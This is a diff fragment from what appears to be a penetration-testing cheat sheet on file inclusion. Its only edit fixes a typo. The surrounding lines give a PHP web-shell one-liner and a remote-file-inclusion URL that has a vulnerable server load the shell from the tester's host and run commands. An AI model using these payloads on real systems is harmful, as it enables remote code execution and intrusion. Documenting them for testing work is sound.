@@ -84,7 +84,7 @@ Both: <code>/home/pharo/wordlist/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-hu
 
 <code>ge?php echo shell_exec($_GET['cmd']); ?\le</code>
 
-Store in a file on local host, navigate to it via the wb app and pass commands to it.
+Store in a file on local host, navigate to it via the web app and pass commands to it.
 
 <code>http://[VULN_IP]/[VULN_PAGE]?[VULN_PARAMETER]=http://[LOCAL_IP]/rfi.txt&cmd=[COMMAND]</code>
 
